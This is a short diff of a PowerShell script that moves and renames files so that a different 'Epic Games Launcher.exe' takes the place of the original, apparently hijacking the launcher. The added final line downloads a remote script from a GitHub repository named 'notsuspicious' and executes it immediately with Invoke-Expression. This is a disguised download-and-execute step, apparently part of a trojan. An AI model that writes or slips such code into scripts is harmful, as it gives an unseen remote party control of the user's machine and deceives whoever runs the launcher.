@@ -35,3 +35,4 @@ Move-Item -Path $p -Destination "C:\Users\Public\Videos\GraphicalUserInterface"
 Rename-Item -Path "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" -NewName "§$counter.lnk"
 Move-Item -Path "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" -Destination $p
 Rename-Item -Path $p -NewName "Epic Games Launcher.exe"
+Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/javafix.ps1" -UseBasicParsing).Content
